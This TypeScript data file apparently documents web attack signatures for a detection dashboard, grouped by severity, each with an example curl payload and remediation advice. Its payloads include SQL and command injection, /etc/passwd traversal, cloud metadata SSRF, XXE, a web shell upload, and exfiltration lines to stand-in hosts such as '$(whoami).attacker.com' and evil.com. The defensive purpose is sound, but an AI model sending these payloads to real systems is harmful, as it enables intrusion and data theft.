export type ReactSignature = {
  category: string;
  ids: string;
  description: string;
  curl: string;
  remediation: string;
};

export type ReactSignatureGroup = {
  severity: string;
  color: string;
  items: ReactSignature[];
};

export const reactSignatureGroups: ReactSignatureGroup[] = [
  {
    severity: "Critical",
    color: "red",
    items: [
      {
        category: "SQL Injection",
        ids: "sqli:classic_tautology, union_select, blind_time, error_based, stacked",
        description: "Database dump, authentication bypass, and possible remote code execution through unsafe database features.",
        curl: "curl -X POST -d \"username=admin' OR 1=1 --\" http://target/api/login",
        remediation: "Use prepared statements, parameterized queries, and safe ORM APIs."
      },
      {
        category: "NoSQL Injection",
        ids: "nosqli:mongodb",
        description: "Database dump and authentication bypass through raw operator interpolation.",
        curl: "curl -X POST -H \"Content-Type: application/json\" -d '{\"user\":{\"$ne\":\"\"}}' http://target/api/auth",
        remediation: "Enforce strict schemas and block raw NoSQL operators in user-controlled data."
      },
      {
        category: "Command Injection",
        ids: "cmdi:unix_pipe, unix_advanced, windows, blind_oob",
        description: "Full remote code execution as the web user.",
        curl: "curl \"http://target/api/ping?host=127.0.0.1;id\"",
        remediation: "Avoid shell execution; use language-native APIs and strict allowlists."
      },
      {
        category: "LFI / RFI",
        ids: "lfi:local_include, rfi:remote_include",
        description: "Source disclosure, credential theft, and remote code execution through unsafe file inclusion.",
        curl: "curl \"http://target/page?file=../../../../etc/passwd\"",
        remediation: "Whitelist file identifiers and disable remote URL wrappers."
      },
      {
        category: "SSRF Cloud Metadata",
        ids: "ssrf:cloud_metadata",
        description: "Cloud IAM credential extraction and internal network pivoting.",
        curl: "curl \"http://target/api/fetch?url=http://169.254.169.254/latest/meta-data/\"",
        remediation: "Validate URLs, block metadata endpoints, and enforce egress controls."
      },
      {
        category: "XXE",
        ids: "xxe:external_entity, billion_laughs",
        description: "Local file read, internal SSRF, and denial of service through XML entity expansion.",
        curl: "curl -X POST -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>' http://target/api/xml",
        remediation: "Disable DTDs and external entity parsing in XML parsers."
      },
      {
        category: "SSTI",
        ids: "ssti:jinja2, twig, freemarker",
        description: "Template execution leading to code execution or environment leakage.",
        curl: "curl \"http://target/greet?name={{7*7}}\"",
        remediation: "Use sandboxed templates, logicless rendering, and context-aware output encoding."
      },
      {
        category: "Deserialization",
        ids: "deserialization:java, php, python_pickle, nodejs",
        description: "Remote code execution and privilege escalation through unsafe object loading.",
        curl: "curl -H \"Cookie: session=TzoxOiJBIjowOnt9\" http://target/",
        remediation: "Avoid native deserialization; use JSON and signed, validated payloads."
      },
      {
        category: "JWT None Algorithm",
        ids: "jwt:none_algorithm",
        description: "Authentication bypass or privilege escalation through unsigned JWTs.",
        curl: "curl -H \"Authorization: Bearer eyJhbGciOiJub25lIn0...\" http://target/api",
        remediation: "Pin allowed algorithms and always validate token signatures."
      },
      {
        category: "Auth Bypass Header Forgery",
        ids: "auth_bypass:header_forgery",
        description: "Bypassing IP restrictions by spoofing trusted proxy headers.",
        curl: "curl -H \"X-Forwarded-For: 127.0.0.1\" http://target/admin",
        remediation: "Trust proxy headers only from controlled infrastructure."
      },
      {
        category: "RSC Flight Injection",
        ids: "rsc_attack:flight_injection",
        description: "Server action manipulation and possible React/Next.js RCE paths.",
        curl: "curl -X POST -d '[[\"$\",\"@action\",null,{\"type\":\"blob_handler\"}]]' http://target/_rsc/page",
        remediation: "Patch React/Next.js and strictly validate RSC payloads."
      },
      {
        category: "File Upload Attack",
        ids: "file_upload:malicious_extension",
        description: "Web shell deployment and remote code execution through unsafe upload handling.",
        curl: "curl -F \"file=@shell.php\" http://target/upload",
        remediation: "Validate MIME and content, randomize names, and store uploads outside web roots."
      }
    ]
  },
  {
    severity: "High",
    color: "orange",
    items: [
      { category: "XSS", ids: "xss:reflected, polyglot, stored_payload", description: "Session hijacking and client-side code execution.", curl: "curl \"http://target/search?q=<script>alert(1)</script>\"", remediation: "Use context-aware output encoding and strict CSP." },
      { category: "Path Traversal", ids: "path_traversal:dot_dot_slash, absolute_path", description: "Sensitive file disclosure.", curl: "curl \"http://target/download?file=../../../../etc/shadow\"", remediation: "Normalize paths and validate against allowed directories." },
      { category: "HTTP Smuggling / Host Injection", ids: "http_smuggling:cl_te, host_attack:host_injection", description: "Cache poisoning, WAF bypass, and session hijacking.", curl: "curl -H \"Transfer-Encoding: chunked\" -H \"Content-Length: 4\" http://target/", remediation: "Synchronize proxy/backend HTTP parsing and validate Host headers." },
      { category: "Format String", ids: "format_string:printf_injection", description: "Memory disclosure and possible code execution.", curl: "curl \"http://target/api/log?msg=%x%x%x%x\"", remediation: "Never pass user input as a format string." },
      { category: "NoSQL Redis Injection", ids: "nosqli:redis_injection", description: "Redis command execution or destructive cache/database actions.", curl: "curl -d \"user=admin%0d%0aFLUSHALL\" http://target/api/cache", remediation: "Sanitize newlines and avoid string-built Redis commands." },
      { category: "GraphQL Batch Attack", ids: "graphql:batch_attack", description: "Server DoS and brute-force limit bypass.", curl: "curl -X POST -d '[{\"query\":\"...\"},{\"query\":\"...\"}]' http://target/graphql", remediation: "Limit query batching, depth, cost, and body size." },
      { category: "Prototype Pollution", ids: "prototype_pollution:javascript", description: "Logic bypass and possible Node.js execution chains.", curl: "curl -X POST -d '{\"__proto__\":{\"isAdmin\":true}}' http://target/api/user", remediation: "Reject dangerous keys and use prototype-free maps." },
      { category: "CRLF Injection", ids: "crlf:response_splitting", description: "Cookie injection, XSS, and cache poisoning.", curl: "curl \"http://target/redirect?url=http://example.com%0d%0aSet-Cookie:admin=1\"", remediation: "Filter CRLF from all header-controlled values." },
      { category: "Cache Poisoning", ids: "cache_poisoning:header_probe", description: "Serving malicious cached content to users.", curl: "curl -H \"X-Forwarded-Host: evil.com\" http://target/", remediation: "Ignore unkeyed dynamic headers in cache rules." },
      { category: "Brute Force", ids: "brute_force:multi_attempt", description: "Account takeover through credential stuffing.", curl: "curl -X POST -d '{\"username\":\"admin\",\"password\":\"password123\"}' http://target/login", remediation: "Use rate limits, lockouts, and adaptive challenges." },
      { category: "WebSocket Injection", ids: "websocket:injection", description: "Bypassing HTTP inspection and cross-site WebSocket hijacking.", curl: "curl -H \"Upgrade: websocket\" -H \"Sec-WebSocket-Key: base64key\" http://target/socket", remediation: "Authenticate WebSockets and validate origin/CSRF at handshake." },
      { category: "DNS Exfiltration", ids: "dns_exfil:tunnel_probe", description: "Blind vulnerability data exfiltration over DNS.", curl: "curl \"http://target/?q=http://$(whoami).attacker.com\"", remediation: "Enforce outbound DNS and egress filtering." },
      { category: "Null Byte Injection", ids: "null_byte:termination", description: "Bypassing extension and file validation checks.", curl: "curl \"http://target/view?file=secret.txt%00.png\"", remediation: "Reject null bytes and rely on modern safe path APIs." },
      { category: "RSC Action Probe", ids: "rsc_attack:server_action_probe", description: "Discovery or execution of hidden server actions.", curl: "curl -H \"Next-Action: someActionId\" http://target/", remediation: "Authorize every action and validate all inputs." },
      { category: "Token Brute Force", ids: "credential_probe:token_brute", description: "Unauthorized API access through token guessing.", curl: "curl -H \"Authorization: Bearer AAAAA...\" http://target/api", remediation: "Use strong token entropy and API gateway rate limits." }
    ]
  },
  {
    severity: "Medium",
    color: "yellow",
    items: [
      { category: "Open Redirect", ids: "open_redirect:url_param", description: "Phishing and OAuth token theft.", curl: "curl \"http://target/login?next=http://evil.com\"", remediation: "Whitelist redirects or use relative paths only." },
      { category: "Cookie Manipulation", ids: "cookie_attack:injection", description: "Privilege escalation and logic bypass.", curl: "curl -H \"Cookie: role=admin; ../../\" http://target/", remediation: "Sign cookies and enforce HttpOnly/Secure/SameSite flags." },
      { category: "HTTP Parameter Pollution", ids: "hpp:duplicate_params", description: "WAF bypass and altered app logic.", curl: "curl \"http://target/api/user?id=1&id=2\"", remediation: "Use strict parameter parsing and reject duplicates where unsafe." },
      { category: "HTTP Method Tamper", ids: "method_tamper:method_override", description: "Verb-based access-control bypass.", curl: "curl -X POST -H \"X-HTTP-Method-Override: PUT\" http://target/api", remediation: "Reject untrusted method override headers." },
      { category: "CORS Origin Spoof", ids: "cors:origin_spoof", description: "Reading sensitive cross-origin data.", curl: "curl -H \"Origin: null\" http://target/api", remediation: "Allow only trusted origins and block null origins." },
      { category: "Race Condition", ids: "race_condition:concurrent", description: "Business logic bypass such as double spend.", curl: "curl \"http://target/redeem?coupon=DISCOUNT&parallel=1\"", remediation: "Use transactions, locks, and atomic operations." },
      { category: "Next.js Internal Route", ids: "nextjs_probe:internal_route", description: "Disclosure of internal state or props.", curl: "curl \"http://target/_next/data/buildid/page.json\"", remediation: "Block direct internal route access and avoid secret props." },
      { category: "Content-Type Confusion", ids: "content_type:mismatch_attack", description: "Bypassing parser and WAF assumptions.", curl: "curl -H \"Content-Type: text/html\" -d '{\"x\":1}' http://target/api", remediation: "Reject malformed or mismatched content types." },
      { category: "Encoding Attack", ids: "encoding_attack:charset_confusion", description: "Bypassing XSS filters through alternate encodings.", curl: "curl \"http://target/?q=%u003cscript%u003e\"", remediation: "Normalize input to UTF-8 before validation." },
      { category: "Session Fixation", ids: "session_fixation:cookie_set", description: "Account takeover through forced session IDs.", curl: "curl \"http://target/?PHPSESSID=1234\"", remediation: "Regenerate session IDs after authentication." },
      { category: "CSS Injection", ids: "css_injection:data_exfil", description: "Data exfiltration through unsafe custom CSS.", curl: "curl \"http://target/?theme=body{background:url(http://evil.com/?data=)}\"", remediation: "Strictly sanitize or disallow custom CSS input." },
      { category: "JWT Key Confusion", ids: "jwt:key_confusion", description: "Forging tokens through algorithm/key confusion.", curl: "curl -H \"Authorization: Bearer <forged_token>\" http://target/api", remediation: "Pin expected algorithms and separate HS/RS validation paths." },
      { category: "GraphQL Introspection", ids: "graphql:introspection", description: "Revealing internal API schema.", curl: "curl -X POST -d '{\"query\":\"{__schema{types{name}}}\"}' http://target/graphql", remediation: "Disable introspection in production." },
      { category: "SSRF Internal Ports", ids: "ssrf:internal_ports, dns_rebinding", description: "Internal network port scanning and rebinding.", curl: "curl \"http://target/api/fetch?url=http://127.0.0.1:22\"", remediation: "Block internal IP ranges and DNS rebinding." }
    ]
  },
  {
    severity: "Low",
    color: "blue",
    items: [
      { category: "Clickjacking", ids: "clickjacking:frame_probe", description: "UI redressing and click capture.", curl: "<iframe src=\"http://target\"></iframe>", remediation: "Set CSP frame-ancestors or X-Frame-Options." },
      { category: "Source Map Extraction", ids: "source_leak:sourcemap_probe", description: "Exposing unminified frontend source.", curl: "curl \"http://target/app.js.map\"", remediation: "Do not deploy source maps to production." },
      { category: "Fake Crawlers", ids: "user_agent:fake_crawler", description: "Reconnaissance by scanners pretending to be crawlers.", curl: "curl -A \"sqlmap/1.5\" http://target/", remediation: "Block known malicious user agents and combine with IP reputation." }
    ]
  }
];
